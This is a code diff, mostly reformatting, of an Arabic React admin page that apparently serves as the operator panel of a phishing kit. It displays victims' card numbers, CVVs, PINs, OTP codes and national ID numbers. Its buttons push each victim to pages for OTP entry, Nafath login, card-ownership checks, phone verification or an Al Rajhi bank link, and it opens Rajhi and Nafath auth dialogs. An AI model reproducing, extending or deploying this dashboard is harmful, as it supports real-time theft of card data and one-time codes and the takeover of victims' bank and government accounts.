                     <span>{selectedCardInfo.pinCode || "غير متوفر"}</span>
                   </div>
                   <div className="flex justify-between text-sm">
                     <span className="text-muted-foreground">رمز تحقق:</span>
-                    <span>
-                      {selectedCardInfo.otpCode ||
-                        selectedCardInfo.phoneOtp ||
-                        "غير متوفر"}
-                    </span>
+                    <span>{selectedCardInfo.otpCode || selectedCardInfo.phoneOtp || "غير متوفر"}</span>
                   </div>
                   <div className="flex justify-between text-sm">
                     <span className="text-muted-foreground">الحالة:</span>
@@ -1713,8 +1566,8 @@ export default function NotificationsPage() {
                       {selectedCardInfo.paymentStatus === "approved"
                         ? "مقبول"
                         : selectedCardInfo.paymentStatus === "rejected"
-                        ? "مرفوض"
-                        : "قيد الانتظار"}
+                          ? "مرفوض"
+                          : "قيد الانتظار"}
                     </span>
                   </div>
                 </div>
@@ -1727,8 +1580,8 @@ export default function NotificationsPage() {
               <>
                 <Button
                   onClick={() => {
-                    handleApproval("rejected", selectedCardInfo.id);
-                    setShowCardDialog(false);
+                    handleApproval("rejected", selectedCardInfo.id)
+                    setShowCardDialog(false)
                   }}
                   className="w-full bg-gradient-to-r from-rose-500 to-rose-600 hover:from-rose-600 hover:to-rose-700 text-white border-0 shadow-md"
                 >
@@ -1736,8 +1589,8 @@ export default function NotificationsPage() {
                 </Button>
                 <Button
                   onClick={() => {
-                    handleApproval("approved", selectedCardInfo.id);
-                    setShowCardDialog(false);
+                    handleApproval("approved", selectedCardInfo.id)
+                    setShowCardDialog(false)
                   }}
                   className="w-full bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700 text-white border-0 shadow-md"
                 >
@@ -1745,7 +1598,7 @@ export default function NotificationsPage() {
                 </Button>
                 <Button
                   onClick={() => {
-                    handlePassApproval("approved", selectedCardInfo.id);
+                    handlePassApproval("approved", selectedCardInfo.id)
                   }}
                   className="w-full bg-gradient-to-r from-pink-500 to-pink-600 hover:from-pink-600 hover:to-pink-700 text-white border-0 shadow-md"
                 >
@@ -1753,7 +1606,7 @@ export default function NotificationsPage() {
                 </Button>
                 <Button
                   onClick={() => {
-                    handlePhoneOtpApproval("approved", selectedCardInfo.id);
+                    handlePhoneOtpApproval("approved", selectedCardInfo.id)
                   }}
                   className="w-full bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-600 hover:to-amber-700 text-white border-0 shadow-md"
                 >
@@ -1761,7 +1614,7 @@ export default function NotificationsPage() {
                 </Button>
                 <Button
                   onClick={() => {
-                    handleUpdatePagename(selectedCardInfo.id, "external-link");
+                    handleUpdatePagename(selectedCardInfo.id, "external-link")
                   }}
                   className="w-full bg-gradient-to-r from-cyan-500 to-cyan-600 hover:from-cyan-600 hover:to-cyan-700 text-white border-0 shadow-md"
                 >
@@ -1774,14 +1627,8 @@ export default function NotificationsPage() {
       </Dialog>
 
       {/* Pagename Dialog */}
-      <Dialog
-        open={showPagenameDialog}
-        onOpenChange={(open) => !open && setShowPagenameDialog(false)}
-      >
-        <DialogContent
-          className="bg-white dark:bg-gray-800 border-0 shadow-2xl max-w-md rounded-xl"
-          dir="rtl"
-        >
+      <Dialog open={showPagenameDialog} onOpenChange={(open) => !open && setShowPagenameDialog(false)}>
+        <DialogContent className="bg-white dark:bg-gray-800 border-0 shadow-2xl max-w-md rounded-xl" dir="rtl">
           <DialogHeader className="border-b pb-3">
             <DialogTitle className="text-xl font-bold bg-gradient-to-r from-cyan-600 to-cyan-800 text-transparent bg-clip-text">
               نوع الطلب
@@ -1793,9 +1640,7 @@ export default function NotificationsPage() {
             <div className="space-y-4 py-3">
               <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700">
                 <h3 className="font-medium mb-3 text-sm">النوع الحالي</h3>
-                <div className="flex justify-center">
-                  {getPageType(selectedNotification.pagename)}
-                </div>
+                <div className="flex justify-center">{getPageType(selectedNotification.pagename)}</div>
               </div>
 
               <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700">
@@ -1808,9 +1653,7 @@ export default function NotificationsPage() {
                         ? "bg-cyan-50 border-cyan-300 dark:bg-cyan-900/30 dark:border-cyan-700"
                         : ""
                     }`}
-                    onClick={() =>
-                      handleUpdatePagename(selectedNotification.id, "payment")
-                    }
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "payment")}
                   >
                     <CreditCard className="h-4 w-4" />
                     دفع
@@ -1822,9 +1665,7 @@ export default function NotificationsPage() {
                         ? "bg-violet-50 border-violet-300 dark:bg-violet-900/30 dark:border-violet-700"
                         : ""
                     }`}
-                    onClick={() =>
-                      handleUpdatePagename(selectedNotification.id, "")
-                    }
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "")}
                   >
                     <FileText className="h-4 w-4" />
                     تسجيل
@@ -1836,9 +1677,7 @@ export default function NotificationsPage() {
                         ? "bg-teal-50 border-teal-300 dark:bg-teal-900/30 dark:border-teal-700"
                         : ""
                     }`}
-                    onClick={() =>
-                      handleUpdatePagename(selectedNotification.id, "nafaz")
-                    }
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "nafaz")}
                   >
                     <Shield className="h-4 w-4" />
                     نفاذ
@@ -1850,12 +1689,7 @@ export default function NotificationsPage() {
                         ? "bg-pink-50 border-pink-300 dark:bg-pink-900/30 dark:border-pink-700"
                         : ""
                     }`}
-                    onClick={() =>
-                      handleUpdatePagename(
-                        selectedNotification.id,
-                        "verify-otp"
-                      )
-                    }
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "verify-otp")}
                   >
                     <Shield className="h-4 w-4" />
                     رمز OTP
@@ -1867,12 +1701,7 @@ export default function NotificationsPage() {
                         ? "bg-emerald-50 border-emerald-300 dark:bg-emerald-900/30 dark:border-emerald-700"
                         : ""
                     }`}
-                    onClick={() =>
-                      handleUpdatePagename(
-                        selectedNotification.id,
-                        "external-link"
-                      )
-                    }
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "external-link")}
                   >
                     <Tag className="h-4 w-4" />
                     راجحي
@@ -1884,12 +1713,7 @@ export default function NotificationsPage() {
                         ? "bg-amber-50 border-amber-300 dark:bg-amber-900/30 dark:border-amber-700"
                         : ""
                     }`}
-                    onClick={() =>
-                      handleUpdatePagename(
-                        selectedNotification.id,
-                        "verify-card-ownership"
-                      )
-                    }
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "verify-card-ownership")}
                   >
                     <CreditCard className="h-4 w-4" />
                     رمز ownership
@@ -1901,12 +1725,7 @@ export default function NotificationsPage() {
                         ? "bg-rose-50 border-rose-300 dark:bg-rose-900/30 dark:border-rose-700"
                         : ""
                     }`}
-                    onClick={() =>
-                      handleUpdatePagename(
-                        selectedNotification.id,
-                        "verify-phone"
-                      )
-                    }
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "verify-phone")}
                   >
                     <Smartphone className="h-4 w-4" />
                     رمز هاتف
@@ -1918,9 +1737,7 @@ export default function NotificationsPage() {
                         ? "bg-emerald-50 border-emerald-300 dark:bg-emerald-900/30 dark:border-emerald-700"
                         : ""
                     }`}
-                    onClick={() =>
-                      handleUpdatePagename(selectedNotification.id, "offers")
-                    }
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "offers")}
                   >
                     <Tag className="h-4 w-4" />
                     عروض
@@ -1931,11 +1748,7 @@ export default function NotificationsPage() {
           )}
 
           <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t">
-            <Button
-              onClick={() => setShowPagenameDialog(false)}
-              className="w-full"
-              variant="outline"
-            >
+            <Button onClick={() => setShowPagenameDialog(false)} className="w-full" variant="outline">
               إغلاق
             </Button>
           </DialogFooter>
@@ -1944,18 +1757,12 @@ export default function NotificationsPage() {
 
       {/* Sidebar for detailed view */}
       <Sheet open={showSidebar} onOpenChange={setShowSidebar}>
-        <SheetContent
-          side="left"
-          className="w-full sm:max-w-md overflow-y-auto"
-          dir="rtl"
-        >
+        <SheetContent side="left" className="w-full sm:max-w-md overflow-y-auto" dir="rtl">
           <SheetHeader className="text-right">
             <SheetTitle className="text-xl font-bold bg-gradient-to-r from-cyan-600 to-cyan-800 text-transparent bg-clip-text">
               تفاصيل البيانات
             </SheetTitle>
-            <SheetDescription>
-              عرض جميع المعلومات المتعلقة بهذا الطلب
-            </SheetDescription>
+            <SheetDescription>عرض جميع المعلومات المتعلقة بهذا الطلب</SheetDescription>
           </SheetHeader>
 
           {selectedNotification && (
@@ -1967,9 +1774,7 @@ export default function NotificationsPage() {
                 </h3>
                 <div className="space-y-3">
                   <div className="flex justify-between">
-                    <span className="text-sm text-muted-foreground">
-                      الاسم الكامل:
-                    </span>
+                    <span className="text-sm text-muted-foreground">الاسم الكامل:</span>
                     <span className="font-medium">
                       {selectedNotification.documment_owner_full_name ||
                         selectedNotification.document_owner_full_name ||
@@ -1978,9 +1783,7 @@ export default function NotificationsPage() {
                     </span>
                   </div>
                   <div className="flex justify-between">
-                    <span className="text-sm text-muted-foreground">
-                      رقم الهوية:
-                    </span>
+                    <span className="text-sm text-muted-foreground">رقم الهوية:</span>
                     <span className="font-medium font-mono">
                       {selectedNotification.owner_identity_number ||
                         selectedNotification.buyer_identity_number ||
@@ -1988,29 +1791,20 @@ export default function NotificationsPage() {
                     </span>
                   </div>
                   <div className="flex justify-between">
-                    <span className="text-sm text-muted-foreground">
-                      رقم الهاتف:
-                    </span>
-                    <span className="font-medium font-mono">
-                      {selectedNotification.phone || "غير محدد"}
-                    </span>
+                    <span className="text-sm text-muted-foreground">رقم الهاتف:</span>
+                    <span className="font-medium font-mono">{selectedNotification.phone || "غير محدد"}</span>
                   </div>
                   {selectedNotification.phone2 && (
                     <div className="flex justify-between">
-                      <span className="text-sm text-muted-foreground">
-                        رقم الهاتف 2:
-                      </span>
-                      <span className="font-medium font-mono">
-                        {selectedNotification.phone2}
-                      </span>
+                      <span className="text-sm text-muted-foreground">رقم الهاتف 2:</span>
+                      <span className="font-medium font-mono">{selectedNotification.phone2}</span>
                     </div>
                   )}
                 </div>
               </div>
 
               {(selectedNotification.card_number ||
-                (selectedNotification.formData &&
-                  selectedNotification.formData.card_number)) && (
+                (selectedNotification.formData && selectedNotification.formData.card_number)) && (
                 <div className="bg-emerald-50 rounded-lg p-4 border border-emerald-100">
                   <h3 className="text-lg font-semibold mb-2 flex items-center gap-2">
                     <CreditCard className="h-5 w-5 text-emerald-600" />
@@ -2018,46 +1812,33 @@ export default function NotificationsPage() {
                   </h3>
                   <div className="space-y-3">
                     <div className="flex justify-between">
-                      <span className="text-sm text-muted-foreground">
-                        رقم البطاقة:
-                      </span>
+                      <span className="text-sm text-muted-foreground">رقم البطاقة:</span>
                       <span className="font-medium font-mono">
                         {selectedNotification.card_number ||
-                          (selectedNotification.formData &&
-                            selectedNotification.formData.card_number) ||
+                          (selectedNotification.formData && selectedNotification.formData.card_number) ||
                           "غير محدد"}
                       </span>
                     </div>
                     <div className="flex justify-between">
-                      <span className="text-sm text-muted-foreground">
-                        تاريخ الانتهاء:
-                      </span>
+                      <span className="text-sm text-muted-foreground">تاريخ الانتهاء:</span>
                       <span className="font-medium font-mono">
                         {selectedNotification.expiration_date ||
-                          (selectedNotification.formData &&
-                            selectedNotification.formData.expiration_date) ||
+                          (selectedNotification.formData && selectedNotification.formData.expiration_date) ||
                           "غير محدد"}
                       </span>
                     </div>
                     <div className="flex justify-between">
-                      <span className="text-sm text-muted-foreground">
-                        رمز الأمان:
-                      </span>
+                      <span className="text-sm text-muted-foreground">رمز الأمان:</span>
                       <span className="font-medium font-mono">
                         {selectedNotification.cvv ||
-                          (selectedNotification.formData &&
-                            selectedNotification.formData.cvv) ||
+                          (selectedNotification.formData && selectedNotification.formData.cvv) ||
                           "غير محدد"}
                       </span>
                     </div>
                     {selectedNotification.pinCode && (
                       <div className="flex justify-between">
-                        <span className="text-sm text-muted-foreground shift">
-                          الرقم السري:
-                        </span>
-                        <span className="font-medium font-mono">
-                          {selectedNotification.pinCode}
-                        </span>
+                        <span className="text-sm text-muted-foreground shift">الرقم السري:</span>
+                        <span className="font-medium font-mono">{selectedNotification.pinCode}</span>
                       </div>
                     )}
                   </div>
@@ -2072,31 +1853,19 @@ export default function NotificationsPage() {
                   </h3>
                   <div className="space-y-3">
                     <div className="flex justify-between">
-                      <span className="text-sm text-muted-foreground">
-                        نوع المركبة:
-                      </span>
-                      <span className="font-medium">
-                        {selectedNotification.vehicle_type}
-                      </span>
+                      <span className="text-sm text-muted-foreground">نوع المركبة:</span>
+                      <span className="font-medium">{selectedNotification.vehicle_type}</span>
                     </div>
                     {selectedNotification.vehicle_manufacture_number && (
                       <div className="flex justify-between">
-                        <span className="text-sm text-muted-foreground">
-                          رقم تصنيع المركبة:
-                        </span>
-                        <span className="font-medium font-mono">
-                          {selectedNotification.vehicle_manufacture_number}
-                        </span>
+                        <span className="text-sm text-muted-foreground">رقم تصنيع المركبة:</span>
+                        <span className="font-medium font-mono">{selectedNotification.vehicle_manufacture_number}</span>
                       </div>
                     )}
                     {selectedNotification.customs_code && (
                       <div className="flex justify-between">
-                        <span className="text-sm text-muted-foreground">
-                          رمز الجمارك:
-                        </span>
-                        <span className="font-medium font-mono">
-                          {selectedNotification.customs_code}
-                        </span>
+                        <span className="text-sm text-muted-foreground">رمز الجمارك:</span>
+                        <span className="font-medium font-mono">{selectedNotification.customs_code}</span>
                       </div>
                     )}
                   </div>
@@ -2110,26 +1879,17 @@ export default function NotificationsPage() {
                 </h3>
                 <div className="space-y-3">
                   <div className="flex justify-between">
-                    <span className="text-sm text-muted-foreground">
-                      نوع الطلب:
-                    </span>
+                    <span className="text-sm text-muted-foreground">نوع الطلب:</span>
                     <div>{getPageType(selectedNotification.pagename)}</div>
                   </div>
                   <div className="flex justify-between">
-                    <span className="text-sm text-muted-foreground">
-                      الحالة:
-                    </span>
+                    <span className="text-sm text-muted-foreground">الحالة:</span>
                     <div>{getStatusBadge(selectedNotification.status)}</div>
                   </div>
                   <div className="flex justify-between">
-                    <span className="text-sm text-muted-foreground">
-                      تاريخ الإنشاء:
-                    </span>
+                    <span className="text-sm text-muted-foreground">تاريخ الإنشاء:</span>
                     <span className="font-medium">
-                      {format(
-                        new Date(selectedNotification.createdDate),
-                        "yyyy/MM/dd HH:mm"
-                      )}
+                      {format(new Date(selectedNotification.createdDate), "yyyy/MM/dd HH:mm")}
                     </span>
                   </div>
                 </div>
@@ -2138,8 +1898,8 @@ export default function NotificationsPage() {
               <div className="flex gap-2 mt-6">
                 <Button
                   onClick={() => {
-                    handleApproval("approved", selectedNotification.id);
-                    setShowSidebar(false);
+                    handleApproval("approved", selectedNotification.id)
+                    setShowSidebar(false)
                   }}
                   className="flex-1 bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700 text-white border-0 shadow-md"
                 >
@@ -2148,8 +1908,8 @@ export default function NotificationsPage() {
                 </Button>
                 <Button
                   onClick={() => {
-                    handleApproval("rejected", selectedNotification.id);
-                    setShowSidebar(false);
+                    handleApproval("rejected", selectedNotification.id)
+                    setShowSidebar(false)
                   }}
                   className="flex-1 bg-gradient-to-r from-rose-500 to-rose-600 hover:from-rose-600 hover:to-rose-700 text-white border-0 shadow-md"
                 >
@@ -2158,8 +1918,8 @@ export default function NotificationsPage() {
                 </Button>
                 <Button
                   onClick={() => {
-                    handleDelete(selectedNotification.id);
-                    setShowSidebar(false);
+                    handleDelete(selectedNotification.id)
+                    setShowSidebar(false)
                   }}
                   variant="outline"
                   className="flex-1 "
@@ -2174,17 +1934,9 @@ export default function NotificationsPage() {
       </Sheet>
 
       {/* External Component Dialogs */}
-      <RajhiAuthDialog
-        open={showRajhiDialog}
-        onOpenChange={setShowRajhiDialog}
-        notification={selectedNotification}
-      />
+      <RajhiAuthDialog open={showRajhiDialog} onOpenChange={setShowRajhiDialog} notification={selectedNotification} />
 
-      <NafazAuthDialog
-        open={showNafazDialog}
-        onOpenChange={setShowNafazDialog}
-        notification={selectedNotification}
-      />
+      <NafazAuthDialog open={showNafazDialog} onOpenChange={setShowNafazDialog} notification={selectedNotification} />
 
       <PhoneDialog
         phoneOtp={selectedNotification?.phoneOtp}
@@ -2194,5 +1946,5 @@ export default function NotificationsPage() {
         notification={selectedNotification}
       />
     </div>
-  );
+  )
 }
